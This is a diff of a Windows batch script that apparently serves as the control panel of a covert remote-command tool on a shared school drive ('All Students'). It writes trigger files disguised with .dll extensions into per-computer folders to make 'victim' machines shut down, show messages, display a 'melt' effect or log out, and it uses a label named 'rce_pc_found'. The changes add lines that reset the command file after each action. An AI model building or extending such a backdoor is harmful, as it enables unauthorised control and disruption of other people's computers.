@@ -79,15 +79,13 @@ ping localhost -n %WaitTime% > nul
 set "reset=!ESC![0m"
 set "bold=!ESC![1m"
 set "underline=!ESC![4m"
+ping localhost -n %WaitTime% > nul
 :: _______________________________________________________ END OF SECTION _____________________________________________________________
 echo [-] Loading: Variables...
+:: ______________________________________________MAIN LOCATION VARIABLES ARE SET HERE__________________________________________________
 set "FILE_Collaboration=P:\"
 set "FILE_BackBatch=P:\Composite\All Students\BackBatch"
 set "FILE_Devices=P:\Composite\All Students\BackBatch\Devices"
-ping localhost -n %WaitTime% > nul
-:: ______________________________________________MAIN LOCATION VARIABLES ARE SET HERE__________________________________________________
-set "computers_path=P:\Composite\1k0de_files\computers"
-set "devices_path=!computers_path!\device_list.dll"
 :: _______________________________________________________ END OF SECTION _____________________________________________________________
 echo.
 ping localhost -n %WaitTime% > nul
@@ -380,6 +378,7 @@ if "!VICTIM_CMD!" == "shutdown" (
 			echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
 			ping localhost -n 3 > nul
 			echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+			echo echo No Command>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
 			echo !reset!!green!Successfully completed shutdown...
 			echo.
 			goto rce_pc_found
@@ -406,6 +405,7 @@ if "!VICTIM_CMD!" == "msg" (
 			echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
 			ping localhost -n 3 > nul
 			echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+			echo echo No Command>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
 			echo !reset!!green!Successfully sent message...
 			echo.
 			goto rce_pc_found
@@ -431,6 +431,7 @@ if "!VICTIM_CMD!" == "melt" (
 				echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
 				ping localhost -n 3 > nul
 				echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+				echo echo No Command>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
 				echo !reset!!green!Successfully added melt effect to victims device...
 				echo.
 				goto rce_pc_found
@@ -467,6 +468,7 @@ if "!VICTIM_CMD!" == "logout" (
 			echo exec_now>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
 			ping localhost -n 3 > nul
 			echo dont_exec>"!FILE_Devices!\!Computer_ID_1!\EXEC_CMD.dll"
+			echo echo No Command>"!FILE_Devices!\!Computer_ID_1!\CMD_EXEC.dll"
 			echo !reset!!green!Successfully sent message...
 			echo.
 			goto rce_pc_found
